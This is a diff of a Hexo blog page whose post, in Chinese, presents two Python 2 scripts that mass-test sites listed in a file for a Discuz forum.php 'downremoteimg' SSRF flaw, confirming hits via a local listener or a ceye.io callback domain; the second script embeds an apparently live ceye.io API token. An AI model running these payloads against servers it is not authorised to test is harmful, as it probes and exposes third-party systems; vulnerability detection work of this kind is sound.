@@ -1,96 +1,66 @@
-<!DOCTYPE html>
+<!DOCTYPE HTML>
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
-    <meta http-equiv="content-type" content="text/html; charset=utf-8">
-    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
-    <title>c1y2m3’blog</title>
-    <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
-    <link rel="stylesheet" href="/c1y2m3.github.io/css/gitment.css">
-    <link rel="stylesheet" type="text/css" href="//at.alicdn.com/t/font_859455_eaq7v6w8ktj.css">
+  <meta charset="utf-8">
+  
+  <title>python实现SSRF检测脚本 | c1y2m3’blog</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="咸鱼了一周，在家的感觉真好，就是时间长了人就有惰性了。
+非常简单的检测思路:在本地监听socks端口 -&amp;gt;  发送payload -&amp;gt; 收到回显 -&amp;gt; 检测成功 
+不过在本地检测就有点不太友好了，需要获取到公网IP地址(这里使用os从命令行获取)，然后监听 0.0.0.0,利用多线">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="python实现SSRF检测脚本">
+  <meta property="og:site_name" content="c1y2m3’blog">
+
+  
+    <meta property="og:image" content="">
+  
+
+  
+    <link rel="alternative" href="/c1y2m3.github.io/atom.xml" title="c1y2m3’blog" type="application/atom+xml">
+  
+  
+    <link href="/c1y2m3.github.io/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/c1y2m3.github.io/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/c1y2m3.github.io/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/c1y2m3.github.io/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/c1y2m3.github.io/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/c1y2m3.github.io/css/responsive.css" media="screen" type="text/css">  
+  <link rel="stylesheet" href="/c1y2m3.github.io/css/sidenav.css" media="screen" type="text/css">  
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/c1y2m3.github.io/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
 </head>
-<body>
-<header class="header">
-    <div class="header-inner">
-        <div class="header-title">
+</html>
+<body id="body" data-spy="scroll" data-target=".toc">
+  <div class="container" id="container">
+	<div class="content">
+	  <div class="page-header">		
+  <h1><a class="brand" href="/c1y2m3.github.io/">c1y2m3’blog</a><span class="split"></span><span class="title">python实现SSRF检测脚本</span><span class="date" id="title-date"><i class="fa fa-clock-o"></i> 2019-02-06</span></h1>
+</div>		
 
-        </div>
-        <nav class="header-nav">
-            
-            <a href="/c1y2m3.github.io/" class="header-nav-link">
-                首页
-            </a>
-            
+<div class="row page">
+  <!-- cols -->	
+  
+  
 
-            
-            <a href="/c1y2m3.github.io/archives" class="header-nav-link">
-                归档
-            </a>
-            
+  
+	<div class="col-md-12">
+	  
 
-            
-            <a href="/c1y2m3.github.io/tags" class="header-nav-link">
-                标签
-            </a>
-            
-
-            
-        </nav>
-    </div>
-</header>
-<header class="mobile-header">
-    <div class="mobile-nav">
-        <div class="mobile-nav-icon">
-            <span></span>
-            <span></span>
-            <span></span>
-        </div>
-        <div class="mobile-nav-title">
-            <a href="/c1y2m3.github.io/" class="mobile-nav-title-link">John Doe's Blog</a>
-        </div>
-
-    </div>
-    <nav class="mobile-menu">
-        <ul class="mobile-menu-list">
-            <li class="mobile-menu-item">
-                <i class="iconfont icon-home"></i>
-                <a href="/c1y2m3.github.io/" class="mobile-nav-link">首页</a>
-            </li>
-            <li class="mobile-menu-item">
-                <i class="iconfont icon-archive"></i>
-                <a href="/c1y2m3.github.io/archives" class="mobile-nav-link">归档</a>
-            </li>
-            <li class="mobile-menu-item">
-                <i class="iconfont icon-tag"></i>
-                <a href="/c1y2m3.github.io/tags" class="mobile-nav-link">标签</a>
-            </li>
-            <li class="mobile-menu-item">
-                <i class="iconfont icon-about"></i>
-                <a href="/c1y2m3.github.io/about/" class="mobile-nav-link">关于</a>
-            </li>
-        </ul>
-    </nav>
-</header>
-<div class="main">
-    <div class="content-inner">
-        <div class="posts">
-    <article class="post-whole">
-        <div class="post-title">
-            <h2 class="title">python实现SSRF检测脚本</h2>
-            <div class="post-meta">
-                <span class="post-time">2019-02-06</span>
-                
-                <span class="post-visit"> 阅读次数：<span id="busuanzi_value_page_pv"></span></span>
-            </div>
-        </div>
-        <div class="post-toc" id="post-toc">
-    <strong class="post-toc-title">目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02"><span class="toc-text">0x02</span></a></li></ol>
-    <div class="back-to-top" id="back-to-top">
-        <a href="javascript:void(0);">回到顶部</a>
-    </div>
-</div>
-        <div class="post-content">
-            <p>咸鱼了一周，在家的感觉真好，就是时间长了人就有惰性了。</p>
+	  <!-- content -->
+	  <p>咸鱼了一周，在家的感觉真好，就是时间长了人就有惰性了。</p>
 <p>非常简单的检测思路:<br>在本地监听socks端口 -&gt;  发送payload -&gt; 收到回显 -&gt; 检测成功 </p>
 <p>不过在本地检测就有点不太友好了，需要获取到公网IP地址(这里使用os从命令行获取)，然后监听 0.0.0.0,利用多线程, 前提还需要有VPS，或端口转发给路由。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python2.7</span><br><span class="line"># -*- coding:UTF-8 -*-</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">discuz论坛forum.php参数message SSRF漏洞检测</span><br><span class="line">author = &apos;c1y2m3&apos;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import requests</span><br><span class="line">import os</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">port = 8999</span><br><span class="line"></span><br><span class="line">def check():</span><br><span class="line">    ip = &quot;0.0.0.0&quot; </span><br><span class="line">    print &quot;本地监听端口&#123;&#125;&quot;.format(port)</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.bind((ip, port))</span><br><span class="line">    sock.listen(10)</span><br><span class="line">    sock.settimeout(50)</span><br><span class="line">    while True:</span><br><span class="line">        connection, address = sock.accept()</span><br><span class="line">        try:</span><br><span class="line">            connection.settimeout(1)</span><br><span class="line">            print address</span><br><span class="line">            print &quot;目标存在discuz/forum.php参数message/SSRF漏洞&quot;</span><br><span class="line">        except socket.timeout:</span><br><span class="line">            print &quot;error&quot;</span><br><span class="line"></span><br><span class="line">        break</span><br><span class="line">        connection.close()</span><br><span class="line"></span><br><span class="line">def curl():</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    command = &apos;curl ifconfig.me &apos;</span><br><span class="line">    r = os.popen(command)</span><br><span class="line">    info = r.readlines()</span><br><span class="line">    for line in info:</span><br><span class="line">        line = line.strip(&apos;\r\n&apos;)</span><br><span class="line">    payload = &quot;/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://&#123;&#125;:&#123;&#125;/xx.jpg[/img]&amp;formhash=xxoo&quot;.format(</span><br><span class="line">        line,port)</span><br><span class="line">    try:</span><br><span class="line">        with open(&apos;url.txt&apos;,&apos;r+&apos;)as f:</span><br><span class="line">            for domain in f.readlines():</span><br><span class="line">                domain  = domain.strip(&apos;\r\n&apos;)</span><br><span class="line">                domain = domain + payload</span><br><span class="line">                response = requests.get(url=domain)</span><br><span class="line">                print response</span><br><span class="line">    except Exception, e:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line">for i in xrange(2):</span><br><span class="line">    t1 = threading.Thread(target=check)</span><br><span class="line">    t2 = threading.Thread(target=curl)</span><br><span class="line">    threads.append(t1)</span><br><span class="line">    threads.append(t2)</span><br><span class="line">for i in xrange(2):</span><br><span class="line">    threads[i].start()</span><br><span class="line">for i in xrange(2):  # join()方法等待线程完成</span><br><span class="line">    threads[i].join()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    for t in threads:</span><br><span class="line">        t.start()</span><br></pre></td></tr></table></figure>
@@ -98,61 +68,152 @@
 <p>ceye.io API调用获取信息，个人中心可以看见API TOKEN，<a href="http://ceye.io/api" target="_blank" rel="noopener">API使用方法</a>：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python2.7</span><br><span class="line"># -*- coding:UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import urlparse</span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&apos;utf8&apos;)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">discuz论坛forum.php参数message SSRF漏洞检测</span><br><span class="line">author = &apos;c1y2m3&apos;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ceyeapi =&quot;http://g7i2n6.ceye.io/&quot;</span><br><span class="line"></span><br><span class="line">def check():</span><br><span class="line"></span><br><span class="line">    api = &quot;http://api.ceye.io/v1/records?token=647e03c707b3cac32af337fc78ee5039&amp;type=http&amp;filter=jpg&quot;</span><br><span class="line">    r = requests.get(api)</span><br><span class="line">    json_data = json.loads(r.text)</span><br><span class="line">    for i in json_data[&apos;data&apos;]:</span><br><span class="line">        r = i[&apos;name&apos;]</span><br><span class="line">        response = r.replace(&quot;http://g7i2n6.ceye.io/&quot;,&quot;&quot;).replace(&apos;.jpg&apos;,&apos;&apos;).replace(&apos;http://g7i2n6.ceye.io:80/&apos;,&apos;&apos;)</span><br><span class="line">        print response + &quot; &quot; + &quot;目标存在discuz/forum.php参数message/SSRF漏洞&quot;</span><br><span class="line"></span><br><span class="line">def curl():</span><br><span class="line"></span><br><span class="line">    with open(&apos;url.txt&apos;, &apos;r+&apos;)as f:</span><br><span class="line">        for domain in f.readlines():</span><br><span class="line">            domain = domain.strip(&apos;\n&apos;)</span><br><span class="line">            url_change = urlparse.urlparse(domain)</span><br><span class="line">            url  = url_change.netloc</span><br><span class="line">            payload = &quot;/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]&#123;&#125;/&#123;&#125;.jpg[/img]&amp;formhash=xxoo&quot;.format(</span><br><span class="line">            ceyeapi,url)</span><br><span class="line">            domain = domain + payload</span><br><span class="line">            try:</span><br><span class="line">                time.sleep(1)</span><br><span class="line">                response = requests.get(url=domain,verify=False)</span><br><span class="line">                print &quot;[+]正在检测,&#123;&#125;&quot;.format(domain)</span><br><span class="line">            except:</span><br><span class="line">                print &quot;Error&quot;</span><br><span class="line">    check()</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line">t1 = threading.Thread(target=curl)</span><br><span class="line">threads.append(t1)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    for t in threads:</span><br><span class="line">        t.start()</span><br></pre></td></tr></table></figure>
 <p>最终效果：<br><img src="https://www.yunzhijia.com/microblog/filesvr/5c5b324ee67d0a629aea6eb6" alt=""></p>
+	  
 
-        </div>
-        
-    </article>
+	  <div>
+  		<center>
+		  <div class="pagination">
+<ul class="pagination">
+	
+	
+	
+	
+	
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+			
+		
+	
+		
+			
+			
+			
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+		
+			
+		
+	
+	
+	
+		<li class="prev"><a href="/c1y2m3.github.io/2019/03/16/----1/" class="alignleft prev"><i class="fa fa-arrow-circle-o-left"></i>prev</a></li>
+	
+	<li><a href="/c1y2m3.github.io/"><i class="fa fa-archive"></i>Home</a></li>
+	
+		<li class="next"><a href="/c1y2m3.github.io/2019/01/22/Kerberos域认证/" class="alignright next">next<i class="fa fa-arrow-circle-o-right"></i></a></li>
+	
+</ul>
 </div>
-<div class="paginator">
-    
-        
-            <a class="prev" href="/c1y2m3.github.io/2019/03/16/----1/">
-                <i class="iconfont icon-prev"></i>
-                <span class="nav-default">记一次域渗透攻击测试</span>
-                <span class="nav-mobile">上一篇</span>
-            </a>
-        
-        
-            <a class="next" href="/c1y2m3.github.io/2019/01/22/Kerberos域认证/">
-                <span class="nav-default">理解Kerberos域认证</span>
-                <span class="nav-mobile">下一篇</span>
-                <i class="iconfont icon-next"></i>
-            </a>
-        
-    
-</div>
-<div id="comment-container"></div>
-    </div>
-</div>
-<footer class="footer-social">
-    
 
-    
+		</center>
+	  </div>
+	  
+	</div> <!-- col-md-9/col-md-12 -->
+	
+  </div><!-- row -->
 
-    
+	</div>
+  </div>
+  <div class="container-narrow">
+	<footer> <p>
+  &copy; 2019 John Doe
+  
+      with help from <a href="http://zespia.tw/hexo/" target="_blank">Hexo</a> and <a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a>. Theme by <a href="http://github.com/wzpan/hexo-theme-wixo/">Wixo</a>.    
+</p> </footer>
+  </div> <!-- container-narrow -->
+  
+<a id="gotop" href="#">   
+  <span>▲</span> 
+</a>
 
-    <div class="footer-copyright">
-        <p class="time-line">
-            &copy;
-            
-            
-            2019
-            &nbsp;<i class="iconfont icon-heart"></i>&nbsp;
-            <a target="_blank" href="https://github.com/iJinxin">John Doe</a>
-        </p>
-        <p class="theme-info">
-            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme -
-            <a target="_blank" href="https://github.com/iJinxin/hexo-theme-sky">Sky</a>
-        </p>
-    </div>
-</footer>
-</body>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-<script src="/c1y2m3.github.io/js/index.js"></script>
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
-<script>
-    
+<script src="/c1y2m3.github.io/js/jquery.imagesloaded.min.js"></script>
+<script src="/c1y2m3.github.io/js/gallery.js"></script>
+<script src="/c1y2m3.github.io/js/bootstrap.min.js"></script>
+<script src="/c1y2m3.github.io/js/jquery.tableofcontents.min.js"></script>
+<script src="/c1y2m3.github.io/js/tocgenerator.min.js"></script>
+<script src="/c1y2m3.github.io/js/main.js"></script>
+<script src="/c1y2m3.github.io/js/search.js"></script> 
 
+
+
+
+<link rel="stylesheet" href="/c1y2m3.github.io/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/c1y2m3.github.io/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
 </script>
+
+
+
+
+</body>
 </html>
